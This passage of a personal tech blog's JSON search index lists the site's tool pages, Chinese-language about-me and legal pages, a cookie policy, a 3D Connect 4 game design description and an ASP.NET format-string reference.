aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat."},{"title":"World Clock","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/world-clock/index.html","permalink":"https://neo01.com/tools/world-clock/index.html","excerpt":"","text":"+ Add Timezone Add Timezone Cancel Add"},{"title":"URL Parser","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/url-parser/index.html","permalink":"https://neo01.com/tools/url-parser/index.html","excerpt":"","text":"URL to parse:"},{"title":"关于我","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-CN/about-me/index.html","permalink":"https://neo01.com/zh-CN/about-me/index.html","excerpt":"","text":"我是一位技术专业人士，专精于人工智能、云端架构和网络安全。我在科技产业的旅程促使我通过主要云端平台和安全框架的专业认证持续学习。以下展示的证书代表了企业级技术的实务经验，并展现了我对保持业界最佳实践和新兴技术最新知识的承诺。 本页面显示的所有证书均通过监考考试取得。监考考试是在严格的安全措施下进行的监督评估，包括身份验证、实时监控和受控测试环境，以确保考试的完整性。这与非监考评估不同，后者通常是没有监督测试的在线课程或自学模块。监考认证的严格性质为候选人的验证知识和技能提供了更大的保证。非监考课程完成证书列于另一页面。 除了正式认证外，我还通过各种学习平台和供应商培训计划积极参与新兴技术。我的收藏包括来自完成证书的数字徽章。 更多资讯 … 证书 Google Microsoft Microsoft 和 LinkedIn ISC2 Alibaba Cloud AWS 其他"},{"title":"我的徽章","date":"un44fin44","updated":"un33fin33","comments":false,"path":"zh-CN/about-me/badges.html","permalink":"https://neo01.com/zh-CN/about-me/badges.html","excerpt":"","text":"徽章 Microsoft ISC2 Google Skillshop AWS Alibaba Cloud IBM PMP 其他"},{"title":"非监考认证","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-CN/about-me/non_proctored_certs.html","permalink":"https://neo01.com/zh-CN/about-me/non_proctored_certs.html","excerpt":"","text":"非监考认证是通过在线课程和评估获得的数字证书，无需监督考试。这些认证展示了持续学习的态度，并验证了各种技术领域的特定技术技能。虽然它们可能不如监考专业认证那样具有分量，但对于建立我的作品集来说仍然很有价值。 Google Secure Code Warrior AWS 其他"},{"title":"更多关于我","date":"un44fin44","updated":"un55fin55","comments":false,"path":"zh-CN/about-me/more.html","permalink":"https://neo01.com/zh-CN/about-me/more.html","excerpt":"","text":"我的 GitHub neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% 贡献 Gemini CLI - Fix invalid docker command and invalid JSON in the mcpServers example. HKOpenAI learnGitBranching - Translations - fix typo in zh_TW simple_animated_icon - Add web support in example simple_animated_icon - Upgrade to non-nullable respond6 - add docker file and readme respond6 - remind user the db config can be ignore respond6 - more instructions for setup gists-backup - hide password from prompt using sync-prompt react-chartjs - fix failed to update points for doughnut chart browsermob-proxy - Blacklist with method matcher OpenCV - Fix typos Robotium - Show error message from logcat when its return value is non-zero. chatty - my openshift doesn’t has OPENSHIFT_INTERNAL_PORT and OPENSHIFT_INTERNAL_IP 我的 StackOverflow 我的桌子 2006 其他 我的 Docker Hub 我何时开始使用 Neo 这个名字 许多人将我的英文名字 Neo 与电影《黑客帝国》联想在一起。事实上，我使用这个英文名字已经超过 20 年了。在互联网出现之前，我们通过电话线和调制解调器使用电子公告板系统（BBS）与全球各地进行通信。我原本的英文名字 Leo 与其他 BBS 用户重复，所以我必须选择另一个名字。我选择了 Neo，即使它与来自拉丁美洲的其他用户重复，我仍然继续使用它。"},{"title":"X.509 Certificate Decoder","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/x509-decoder/index.html","permalink":"https://neo01.com/tools/x509-decoder/index.html","excerpt":"","text":"X.509 Certificate (PEM format): Decode Certificate Clear Copy All Text Format Copy Sample Sample Certificate for Testing -----BEGIN CERTIFICATE----- MIIE/TCCA+WgAwIBAgISBnY9ugTPoh5t2QcBI3lLRT7NMA0GCSqGSIb3DQEBCwUA MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD EwNSMTEwHhcNMjUwODE5MjExOTM4WhcNMjUxMTE3MjExOTM3WjAUMRIwEAYDVQQD EwluZW8wMS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCYmFjr 7Mu2d4HocA6HIjHv0mNjZwGckE4QFpSc9Rm2BTBWtoJBYtQxC3nA1OHBNhMfXHAW IdAcUxOMPAyMXRVH+MeUKUGPwuOyKbYbd42oc+rYY5E30iZQYaEEvfp2IgaloD3c B0uPtwYktheSLsmu3BYsLMNslCMtn53UQNqYJj1nhze2TKSj7lIx44cs7TjucKW1 mH3Dh5b7LkVsomwk/2NCtuR81F9rlnMkegyliWiG8XEDeVMOiBxuWqXwgAxmDaSi ILW5CRwANY88iaeKjE5X/R4oGTpj0FYD6fUyDTdAP5qQcTPX17R+QUi0BaqO92U2 h4dmyv9tg0PvSKyNAgMBAAGjggIoMIICJDAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0l BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYE FFjJsqpo5qVIzNgr6EKyv3++RWZoMB8GA1UdIwQYMBaAFMXPRqTq9MPAemyVxC2w XpIvJuO5MDMGCCsGAQUFBwEBBCcwJTAjBggrBgEFBQcwAoYXaHR0cDovL3IxMS5p LmxlbmNyLm9yZy8wIwYDVR0RBBwwGoIJbmVvMDEuY29tgg13d3cubmVvMDEuY29t MBMGA1UdIAQMMAowCAYGZ4EMAQIBMC4GA1UdHwQnMCUwI6AhoB+GHWh0dHA6Ly9y MTEuYy5sZW5jci5vcmcvNzguY3JsMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHcA pELFBklgYVSPD9TqnPt6LSZFTYepfy/fRVn2J086hFQAAAGYxGlA4QAABAMASDBG AiEA+tVCCFfQfZzo2+t2cAYAodoV/h7QNOz4WRMlw59O3hwCIQDzd0xLuxcb/N3X +W/Rtasm6Cx+NUkwkEuwKUAxiElYKAB1ABoE/0nQVB1Ar/agw7/x2MRnL07s7iNA aJhrF0Au3Il9AAABmMRpQVwAAAQDAEYwRAIgGni1NW3egKdCHsYWOd2qJWaGtd0l nbxhbr5FWLmj5GACIBK5VTijGZMCVSM6JCAcVpOWhf3grxTi2MRzt879mdtVMA0G CSqGSIb3DQEBCwUAA4IBAQAENCXxsMuo/QrGuzqvrIh1nlFgiNiQZczA1Lged1U5 ZD1TNZM2JuW0xJQ4eWv4AOEYL28RjHLx0TBQtDQRapufl6MBJ6I/JRi+5cklYyA4 r8cyVAqM38QJxOezXsLPCkDdeqWOcdAAXoMrMDicu0ozgB7mCRjtUwvZthP1ZDwj z+teSsdRD4o8s7JDGUiDtWlQvNPAEnCOwwVLfEvVDWU/C77wc3eyy9jLlPwM+3fb ZieuluG8dYhK7yQni4za5FlP0TbZE9sATFEdxL9ttLaUwqRJ6gPMDyilbf4RHQIP 6TOUuLQwBdMT7fbsAnhkZaaZbTZqR9uhefKhFm5Urx3k -----END CERTIFICATE----- function copySampleCert() { const sampleCert = document.getElementById('sampleCert').textContent; copyText(sampleCert); }"},{"title":"使用条款","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-CN/terms-and-conditions/index.html","permalink":"https://neo01.com/zh-CN/terms-and-conditions/index.html","excerpt":"","text":"内容 本博客提供的所有内容仅供参考。本博客拥有者对本网站上任何信息或通过本网站链接找到的任何信息的准确性或完整性不作任何陈述。拥有者对此信息中的任何错误或遗漏以及此信息的可用性概不负责。拥有者对因显示或使用此信息而造成的任何损失、伤害或损害概不负责。 版权 本网站上的所有内容均为博客拥有者的财产，并受版权法保护。除非事先获得博客拥有者的书面许可，否则严禁复制、重新传输、重新发布或以其他方式使用全部或部分内容。 第三方网站链接 本博客可能包含指向非博客拥有者控制的第三方网站的链接。提供这些链接是为了方便您，博客拥有者对任何链接网站的内容或准确性概不负责。 隐私政策声明 我们与 Microsoft Clarity 和 Microsoft Advertising 合作，通过行为指标、热图和会话重播来捕捉您如何使用我们的网站并与之互动，以改进和推广我们的产品/服务。网站使用数据是使用第一方和第三方 Cookie 以及其他跟踪技术来捕捉的，以确定产品/服务的受欢迎程度和在线活动。此外，我们将此信息用于网站优化、防欺诈/安全目的和广告。有关 Microsoft 如何收集和使用您的数据的更多信息，请访问 Microsoft 隐私声明 AI 生成内容声明 本博客网站利用生成式 AI 工具来增强我们的创作过程，主要专注于写作辅助。我们的 AI 系统，包括 LLaMA 2、LLaMA 3 和 DALL-E，有助于提高可读性、检测拼写和语法错误以及优化搜索引擎排名，但不限于这些功能。虽然我们不依赖 AI 生成的图像或视频，但人工编辑会彻底审查任何 AI 生成的内容，以确保其准确性、相关性和整体质量，然后再将其纳入博客文章中。这种混合方法使我们能够简化工作流程，同时保持最高的创意表达标准。 免责声明 本网站上的信息按「现状」提供，不提供任何明示或暗示的保证，包括但不限于适销性、特定用途适用性或不侵权的保证。 责任限制 在任何情况下，博客拥有者均不对因使用或无法使用本网站或本网站上的任何内容而引起的或与之相关的任何直接、间接、附带、特殊、后果性或惩罚性损害承担责任。 管辖法律和司法管辖权 这些条款和条件应受适用司法管辖区法律的管辖和解释。因这些条款和条件引起的任何争议将受适用司法管辖区法院的专属管辖。 条款和条件的变更 这些使用条款和条件可能随时更改，恕不另行通知。您继续使用本网站即表示接受对这些条款和条件的任何更改。 联系信息 如果您对这些条款和条件有任何疑问或疑虑，请使用本网站上提供的联系信息与博客拥有者联系。","lang":"zh-CN"},{"title":"URL Encoder/Decoder","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/url-encoder/index.html","permalink":"https://neo01.com/tools/url-encoder/index.html","excerpt":"","text":"Text to encode/decode: Hello World! This is a test URL: https://example.com/path?param=value&other=test Encode Decode Copy Result"},{"title":"關於我","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-TW/about-me/index.html","permalink":"https://neo01.com/zh-TW/about-me/index.html","excerpt":"","text":"我是一位技術專業人士，專精於人工智慧、雲端架構和網路安全。我在科技產業的旅程促使我透過主要雲端平台和安全框架的專業認證持續學習。以下展示的證書代表了企業級技術的實務經驗，並展現了我對保持業界最佳實踐和新興技術最新知識的承諾。 本頁面顯示的所有證書均透過監考考試取得。監考考試是在嚴格的安全措施下進行的監督評估，包括身份驗證、即時監控和受控測試環境，以確保考試的完整性。這與非監考評估不同，後者通常是沒有監督測試的線上課程或自學模組。監考認證的嚴格性質為候選人的驗證知識和技能提供了更大的保證。非監考課程完成證書列於另一頁面。 除了正式認證外，我還透過各種學習平台和供應商培訓計劃積極參與新興技術。我的收藏包括來自完成證書的數位徽章。 更多資訊 … 證書 Google Microsoft Microsoft 和 LinkedIn ISC2 Alibaba Cloud AWS 其他"},{"title":"我的徽章","date":"un44fin44","updated":"un33fin33","comments":false,"path":"zh-TW/about-me/badges.html","permalink":"https://neo01.com/zh-TW/about-me/badges.html","excerpt":"","text":"徽章 Microsoft ISC2 Google Skillshop AWS Alibaba Cloud IBM PMP 其他"},{"title":"更多關於我","date":"un44fin44","updated":"un55fin55","comments":false,"path":"zh-TW/about-me/more.html","permalink":"https://neo01.com/zh-TW/about-me/more.html","excerpt":"","text":"我的 GitHub neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% 貢獻 Gemini CLI - Fix invalid docker command and invalid JSON in the mcpServers example. HKOpenAI learnGitBranching - Translations - fix typo in zh_TW simple_animated_icon - Add web support in example simple_animated_icon - Upgrade to non-nullable respond6 - add docker file and readme respond6 - remind user the db config can be ignore respond6 - more instructions for setup gists-backup - hide password from prompt using sync-prompt react-chartjs - fix failed to update points for doughnut chart browsermob-proxy - Blacklist with method matcher OpenCV - Fix typos Robotium - Show error message from logcat when its return value is non-zero. chatty - my openshift doesn’t has OPENSHIFT_INTERNAL_PORT and OPENSHIFT_INTERNAL_IP 我的 StackOverflow 我的桌子 2006 其他 我的 Docker Hub 我何時開始使用 Neo 這個名字 許多人將我的英文名字 Neo 與電影《駭客任務》聯想在一起。事實上，我使用這個英文名字已經超過 20 年了。在網際網路出現之前，我們透過電話線和數據機使用電子佈告欄系統（BBS）與全球各地進行通訊。我原本的英文名字 Leo 與其他 BBS 使用者重複，所以我必須選擇另一個名字。我選擇了 Neo，即使它與來自拉丁美洲的其他使用者重複，我仍然繼續使用它。"},{"title":"非監考認證","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-TW/about-me/non_proctored_certs.html","permalink":"https://neo01.com/zh-TW/about-me/non_proctored_certs.html","excerpt":"","text":"非監考認證是透過線上課程和評估獲得的數位證書，無需監督考試。這些認證展示了持續學習的態度，並驗證了各種技術領域的特定技術技能。雖然它們可能不如監考專業認證那樣具有分量，但對於建立我的作品集來說仍然很有價值。 Google Secure Code Warrior AWS 其他"},{"title":"使用條款","date":"un44fin44","updated":"un66fin66","comments":false,"path":"zh-TW/terms-and-conditions/index.html","permalink":"https://neo01.com/zh-TW/terms-and-conditions/index.html","excerpt":"","text":"內容 本部落格提供的所有內容僅供參考。本部落格擁有者對本網站上任何資訊或透過本網站連結找到的任何資訊的準確性或完整性不作任何陳述。擁有者對此資訊中的任何錯誤或遺漏以及此資訊的可用性概不負責。擁有者對因顯示或使用此資訊而造成的任何損失、傷害或損害概不負責。 版權 本網站上的所有內容均為部落格擁有者的財產，並受版權法保護。除非事先獲得部落格擁有者的書面許可，否則嚴禁複製、重新傳輸、重新發布或以其他方式使用全部或部分內容。 第三方網站連結 本部落格可能包含指向非部落格擁有者控制的第三方網站的連結。提供這些連結是為了方便您，部落格擁有者對任何連結網站的內容或準確性概不負責。 隱私政策聲明 我們與 Microsoft Clarity 和 Microsoft Advertising 合作，透過行為指標、熱圖和會話重播來捕捉您如何使用我們的網站並與之互動，以改進和推廣我們的產品/服務。網站使用數據是使用第一方和第三方 Cookie 以及其他追蹤技術來捕捉的，以確定產品/服務的受歡迎程度和線上活動。此外，我們將此資訊用於網站優化、防詐欺/安全目的和廣告。有關 Microsoft 如何收集和使用您的數據的更多資訊，請訪問 Microsoft 隱私聲明 AI 生成內容聲明 本部落格網站利用生成式 AI 工具來增強我們的創作過程，主要專注於寫作輔助。我們的 AI 系統，包括 LLaMA 2、LLaMA 3 和 DALL-E，有助於提高可讀性、檢測拼寫和語法錯誤以及優化搜尋引擎排名，但不限於這些功能。雖然我們不依賴 AI 生成的圖像或影片，但人工編輯會徹底審查任何 AI 生成的內容，以確保其準確性、相關性和整體品質，然後再將其納入部落格文章中。這種混合方法使我們能夠簡化工作流程，同時保持最高的創意表達標準。 免責聲明 本網站上的資訊按「現狀」提供，不提供任何明示或暗示的保證，包括但不限於適銷性、特定用途適用性或不侵權的保證。 責任限制 在任何情況下，部落格擁有者均不對因使用或無法使用本網站或本網站上的任何內容而引起的或與之相關的任何直接、間接、附帶、特殊、後果性或懲罰性損害承擔責任。 管轄法律和司法管轄權 這些條款和條件應受適用司法管轄區法律的管轄和解釋。因這些條款和條件引起的任何爭議將受適用司法管轄區法院的專屬管轄。 條款和條件的變更 這些使用條款和條件可能隨時更改，恕不另行通知。您繼續使用本網站即表示接受對這些條款和條件的任何更改。 聯絡資訊 如果您對這些條款和條件有任何疑問或疑慮，請使用本網站上提供的聯絡資訊與部落格擁有者聯繫。","lang":"zh-TW"},{"title":"浏览器提示 API 游乐场","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-CN/ai/prompt/index.html","permalink":"https://neo01.com/zh-CN/ai/prompt/index.html","excerpt":"","text":"这是 Chrome 内建 提示 API 的示范，由 Gemini Nano 提供支持。 提示 法国的首都是什么？ 提交提示 重置会话 Top-k 温度 会话统计 温度 Top-k 已使用代币 剩余代币 总代币数 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 对话 原始回应","lang":"zh-CN"},{"title":"Connected 4 in 3D","date":"un55fin55","updated":"un55fin55","comments":true,"path":"zh-CN/games/connected_4_3d/index.html","permalink":"https://neo01.com/zh-CN/games/connected_4_3d/index.html","excerpt":"","text":"玩家 1 的回合 ← ↑ ↓ → 放下 重置 游戏说明 使用方向键（左、右、上、下）移动夹爪。 按空格键放下棋子。 将你的 4 个棋子连成一线（水平、垂直或对角线）即可获胜！ 点击「重置」开始新游戏。 相机控制 旋转视角：按住鼠标左键拖曳。 缩放：滚动鼠标滚轮。 平移视角：按住鼠标右键拖曳（或 Ctrl + 鼠标左键）。","lang":"zh-CN"},{"title":"浏览器文字摘要器游乐场","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-CN/ai/summary/index.html","permalink":"https://neo01.com/zh-CN/ai/summary/index.html","excerpt":"","text":"提示 敏捷的棕色狐狸跳过懒狗。这是一个示范 Chrome 内建 AI 摘要功能的范例文字。文字可以更长、更复杂，包含多个段落、技术细节和各种需要浓缩成更短、更易消化格式的主题。 代币使用量：0 设定 摘要类型： 重点 太长不看 预告 标题 长度： 短 中 长 格式： Markdown 纯文字 摘要 在上方输入文字以产生摘要... 此浏览器不支持摘要 API。请使用启用 AI 功能的 Chrome Canary。 摘要 API 无法使用。请检查您的浏览器设定。","lang":"zh-CN"},{"title":"Connected 4 in 3D 提示词","date":"un66fin66","updated":"un66fin66","comments":true,"path":"zh-CN/games/connected_4_3d/prompt.html","permalink":"https://neo01.com/zh-CN/games/connected_4_3d/prompt.html","excerpt":"","text":"Connected 4 in 3D：技术方法与游戏逻辑 本文档概述了为网页浏览器构建 3D Connected 4 游戏的概念方法，专注于使用 JavaScript 和 Three.js 进行渲染的纯网页实现。 第一部分：技术方法（纯网页与 Three.js） 该游戏将是使用 HTML、CSS 和 JavaScript 构建的单页网页应用程序。Three.js 将用于所有 3D 渲染。 建议架构： HTML 结构 (index.html)： 将包含用于 Three.js 渲染的 canvas 元素。 将包含游戏状态和控制项的基本 UI 元素（例如重置按钮）。 样式 (style.css)： 将为 HTML 元素和 canvas 提供基本样式。 游戏逻辑和 3D 渲染 (script.js)： 这个单一 JavaScript 文件将封装核心游戏逻辑和 Three.js 渲染。 Three.js 设置： 初始化 3D 场景、相机和 WebGL 渲染器。 3D 棋盘和棋子： 使用 Three.js 几何体视觉化创建 5x5x5 网格（例如，棋盘孔使用圆柱体，棋子使用球体）。 用户交互： 实现鼠标事件监听器和 Three.js 光线投射以检测用户在 3D 棋盘上的点击，将屏幕坐标转换为 3D 网格位置。 游戏状态可视化： 更新 3D 场景以反映当前游戏状态（例如，添加新棋子、清除棋盘）。 工作流程示例： 网页加载： index.html 加载，style.css 应用样式，script.js 执行。 Three.js 场景初始化： script.js 设置 Three.js 场景，渲染空的 3D 网格，并设置事件监听器。 用户点击 3D 棋盘： 检测到鼠标点击事件。 光线投射： Three.js 从点击位置执行光线投射到 3D 场景中，以确定目标网格单元格 (x, z)。 游戏逻辑处理： JavaScript 游戏逻辑接收 (x, z) 坐标，确定棋子的 y（垂直）位置，更新其内部棋盘状态，并检查胜利/平局条件。 3D 场景更新： JavaScript 代码指示 Three.js 在计算的 (x, y, z) 坐标处添加新的 3D 棋子，并使用当前玩家的颜色。 游戏状态更新： HTML UI 更新以反映当前游戏状态（例如，下一个玩家的回合、胜利/平局消息）。 第二部分：核心游戏逻辑（JavaScript） 3D Connected 4 的核心游戏逻辑将在 JavaScript 中实现。此逻辑管理游戏状态、玩家回合、棋子放置规则和胜利/平局条件。 以下概述了核心游戏逻辑的当前实现： 1. 游戏棋盘表示 3D 游戏棋盘表示为整数的三维数组： let board; &#x2F;&#x2F; 将初始化为 new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0))); board[x][y][z] 表示 5x5x5 立方体中的一个单元格。 x、y、z 范围从 0 到 4。 0：表示空单元格。 1：表示玩家 1 放置的棋子（例如红色）。 2：表示玩家 2 放置的棋子（例如黄色）。 2. 游戏状态管理 游戏状态由几个变量管理： let currentPlayer = 1;：跟踪轮到谁（1 或 2）。 let gameOver = false;：指示游戏是否已结束（胜利或平局）。 let gameStatus = &quot;Player 1's Turn&quot;;：显示当前游戏状态的字符串（例如「玩家 1 的回合」、「玩家 2 获胜！」、「平局！」）。 3. 游戏初始化 (initializeGame()) 此方法设置新游戏： 将 board 重置为全零（空）。 将 currentPlayer 设回 1。 将 gameOver 设为 false。 将 gameStatus 更新为「玩家 1 的回合」。 清除 3D 场景中的所有现有棋子。 4. 棋子放置逻辑 (addPiece(x, z)) 此方法处理在游戏中放置棋子： 输入： 从用户输入获取 x（列）和 z（深度）坐标。 游戏结束检查： 如果 gameOver 为 true，该方法立即返回。 寻找最低可用 y： 它从底部 (y=0) 向上迭代，以在所选列 (x, z) 中找到第一个空单元格 (board[x][i][z] == 0)。这模拟重力。 放置棋子： 如果找到空的 y 位置： 在 board[x][y][z] 处使用 currentPlayer 的值更新 board。 在计算的 (x, y, z) 坐标处将新的 3D 棋子添加到 Three.js 场景中，并使用当前玩家的颜色。 检查胜利/平局条件： 放置棋子后，它调用 checkWin() 和 checkDraw() 以确定下一个游戏状态。 更新游戏状态： 根据结果（胜利、平局或下一个玩家的回合）更新 gameStatus。 切换玩家： 如果游戏未结束，currentPlayer 切换到另一个玩家。 5. 胜利条件检查 (checkWin(x, y, z)) 这是游戏逻辑中最复杂的部分。它检查从新放置的棋子 (x, y, z) 开始，在 13 个可能的 3D 方向中的任何一个方向上是否有 4 个连续的 currentPlayer 颜色的棋子。 13 个方向是： 3 个轴向方向： X 轴：(1, 0, 0) Y 轴：(0, 1, 0) Z 轴：(0, 0, 1) 6 个平面对角线方向： XY 平面：(1, 1, 0)、(1, -1, 0) XZ 平面：(1, 0, 1)、(1, 0, -1) YZ 平面：(0, 1, 1)、(0, 1, -1) 4 个空间对角线方向： (1, 1, 1) (1, 1, -1) (1, -1, 1) (1, -1, -1) checkWin 方法为每个方向调用 checkLine。 6. 线检查 (checkLine(x, y, z, dx, dy, dz)) 此辅助方法从给定的 (x, y, z) 坐标开始，检查特定方向 (dx, dy, dz) 的胜利： 它沿着由起点和方向定义的线迭代，从起点检查正负方向最多 4 个位置。 它计算 currentPlayer 颜色的连续棋子。 如果找到 4 个或更多连续棋子，它返回 true（胜利）。 它处理边界条件（确保 curX、curY、curZ 保持在 0-4 范围内）。 7. 平局条件检查 (checkDraw()) 此方法确定游戏是否为平局： 它迭代 board 上的每个单元格。 如果它找到任何空单元格 (0)，这意味着棋盘未满，因此不是平局，返回 false。 如果所有单元格都已填满（未找到 0），它返回 true（平局）。 此详细大纲提供了对游戏结构和逻辑的清晰理解，这将使用 JavaScript 和 Three.js 实现。","lang":"zh-CN"},{"title":"Cookie 政策","date":"un11fin11","updated":"un66fin66","comments":true,"path":"zh-CN/pages/cookie-policy/index.html","permalink":"https://neo01.com/zh-CN/pages/cookie-policy/index.html","excerpt":"","text":"最后更新： 2024 年 1 月 1 日 什么是 Cookie Cookie 是当您访问我们的网站时存储在您设备上的小型文本文件。它们帮助我们为您提供更好的浏览体验并分析我们网站的使用情况。 我们使用的 Cookie 类型 必要 Cookie 这些 Cookie 是网站正常运作所必需的，无法停用。 会话 Cookie： 在您浏览时维护您的会话 安全 Cookie： 防范安全威胁 分析 Cookie 这些帮助我们了解访客如何与我们的网站互动。 Google Analytics： 跟踪页面浏览、用户行为和网站性能 保留期限： 26 个月 功能性 Cookie 这些增强您的浏览体验。 偏好设置 Cookie： 记住您的设置和偏好 语言 Cookie： 存储您的语言偏好 营销 Cookie 这些跟踪您的浏览习惯以显示相关广告。 第三方广告 Cookie： 由广告网络使用 社交媒体 Cookie： 启用社交分享功能 第三方 Cookie 我们可能使用设置自己 Cookie 的第三方服务： Google Analytics 社交媒体平台（Twitter、Facebook、LinkedIn） 内容传递网络 您的 Cookie 选择 浏览器设置 您可以通过浏览器设置控制 Cookie： Chrome： 设置 &gt; 隐私和安全 &gt; Cookie Firefox： 选项 &gt; 隐私与安全 &gt; Cookie Safari： 偏好设置 &gt; 隐私 &gt; Cookie Edge： 设置 &gt; Cookie 和网站权限 选择退出选项 要选择退出非必要 Cookie，只需在您首次访问我们网站时点击 Cookie 横幅中的&quot;拒绝&quot;或&quot;拒绝&quot;按钮。如果未显示横幅，请清除您的 Cookie 并重新加载页面以再次看到横幅。 更新 Cookie 偏好设置： 点击此处更新您的 Cookie 偏好设置 处理的法律依据 GDPR（欧盟） 必要 Cookie： 合法利益 分析 Cookie： 同意 营销 Cookie： 同意 CCPA（加州） 您有权： 知道收集了哪些个人信息 删除个人信息 选择退出个人信息的销售 行使隐私权时不受歧视 国际合规性 本政策符合： EU GDPR（一般数据保护条例） UK GDPR 和 2018 年数据保护法 CCPA（加州消费者隐私法） PIPEDA（加拿大个人信息保护） LGPD（巴西一般数据保护法） PDPA（新加坡个人数据保护法） 数据保留 会话 Cookie： 当您关闭浏览器时删除 持久性 Cookie： 依类型而异（30 天至 2 年） 分析数据： 26 个月（Google Analytics 默认值） 您的权利 根据您的位置，您可能有权： 访问 您的个人数据 更正 不准确的数据 删除 您的数据（“被遗忘权”） 限制 处理 数据可携性 反对 处理 随时 撤回同意 儿童隐私 我们的网站适用于 16 岁以下的儿童。在收集 13 岁以下儿童的信息时，我们遵守适用的儿童隐私法，包括 COPPA。 Cookie 同意管理 当您首次访问我们的网站时，您会看到一个 Cookie 横幅，允许您： 接受所有 Cookie 拒绝非必要 Cookie 如果未显示横幅，请清除您的 Cookie 并重新加载页面。 本政策的更新 我们可能会定期更新本 Cookie 政策。变更将发布在此页面上，并更新&quot;最后更新&quot;日期。 联系信息 有关本 Cookie 政策的问题或行使您的权利： 电子邮件： [插入您的电子邮件] 地址： [插入您的地址] 对于欧盟居民，您也可以通过 [插入 DPO 电子邮件] 联系我们的数据保护官。 监管机构 如果您在欧盟并对我们的数据实务有疑虑，您可以联系您当地的监管机构： 欧盟数据保护机构清单 本 Cookie 政策旨在符合国际隐私法。如需具体法律建议，请咨询您所在司法管辖区的合格律师。","lang":"zh-CN"},{"title":"ASP.NET string.Format","date":"un55fin55","updated":"un66fin66","comments":true,"path":"zh-CN/pages/useful-information/aspnet-string-format.html","permalink":"https://neo01.com/zh-CN/pages/useful-information/aspnet-string-format.html","excerpt":"","text":"{0:d} YY-MM-DD {0:p} 百分比00.00% {0:N2} 12.68 {0:N0} 13 {0:c2} $12.68 {0:d} 3/23/2003 {0:T} 12:00:00 AM DataGrid-数据格式设置表达式 数据格式设置表达式 .NET Framework 格式设置表达式，它在数据显示在列中之前先应用于数据。此表达式由可选静态文本和用以下格式表示的格式说明符组成： 零是参数索引，它指示列中要格式化的数据元素；因此，通常用零来指示第一个（且唯一的）元素。format specifier 前面有一个冒号 (😃，它由一个或多个字母组成，指示如何格式化数据。可以使用的格式说明符取决于要格式化的数据类型：日期、数字或其他类型。下表显示了不同数据类型的格式设置表达式的示例。有关格式设置表达式的更多信息，请参见格式化类型。 Currency {0:C} numeric/decimal 显示&quot;Price:&quot;，后跟以货币格式表示的数字。货币格式取决于通过 Page 指令或 Web.config 文件中的区域性属性指定的区域性设置。 Integer {0:D4} 整数()不能和小数一起使用。) 在由零填充的四个字符宽的字段中显示整数。 Numeric {0:N2}% 显示精确到小数点后两位的数字，后跟&quot;%&quot;。 Numeric/Decimal {0:000.0} 四舍五入到小数点后一位的数字。不到三位的数字用零填充。 Date/Datetime Long {0:D} 长日期格式（“Thursday, August 06, 1996”）。日期格式取决于页或 Web.config 文件的区域性设置。 Date/Datetime short {0:d} 短日期格式（“12/31/99”）。 Date/Datetime customize {0:yy-MM-dd} 用数字的年－月－日表示的日期（96-08-06）。 2006-02-22 | asp.net数据格式的Format-- DataFormatString 我们在呈现数据的时候，不要将未经修饰过的数据呈现给使用者。例如金额一万元，如果我们直接显示「10000」，可能会导致使用者看成一千或十万，造成使用者阅读数据上的困扰。若我们将一万元润饰后输出为「NT$10,000」，不但让使比较好阅读，也会让使用者减少犯错的机会。\\n下列画面为润饰过的结果： 上述数据除了将DataGrid Web 控件以颜色来区隔记录外，最主要将日期、单价以及小计这三个计字段的数据修饰的更容易阅读。要修饰字段的输出，只要设置字段的DataFormatString 属性即可；其使用语法如下： DataFormatString=&quot;{0:格式字符串}&quot; 我们知道在DataFormatString 中的 {0} 表示数据本身，而在冒号后面的格式字符串代表所们希望数据显示的格式；另外在指定的格式符号后可以指定小数所要显示的位数。例如原来的数据为「12.34」，若格式设置为 {0:N1}，则输出为「12.3」。其常用的数值格式如下表所示：\\n\\n格式字符串 数据 结果 &quot;{0:C}&quot; 12345.6789 $12,345.68 &quot;{0:C}&quot; -12345.6789 ($12,345.68) &quot;{0:D}&quot; 12345 12345 &quot;{0:D8}&quot; 12345 00012345 &quot;{0:E}&quot; 12345.6789 1234568E+004 &quot;{0:E10}&quot; 12345.6789 1.2345678900E+004 &quot;{0:F}&quot; 12345.6789 12345.68 &quot;{0:F0}&quot; 12345.6789 12346 &quot;{0:G}&quot; 12345.6789 12345.6789 &quot;{0:G7}&quot; 123456789 1.234568E8 &quot;{0:N}&quot; 12345.6789 12,345.68 &quot;{0:N4}&quot; 123456789 123,456,789.0000 &quot;Total: {0:C}&quot; 12345.6789 Total: $12345.68 其常用的日期格式如下表所示： 格式 说明 输出格式 d 精简日期格式 MM/dd/yyyy D 详细日期格式 dddd, MMMM dd, yyyy f 完整格式 (long date + short time) dddd, MMMM dd, yyyy HH:mm F 完整日期时间格式 (long date + long time) 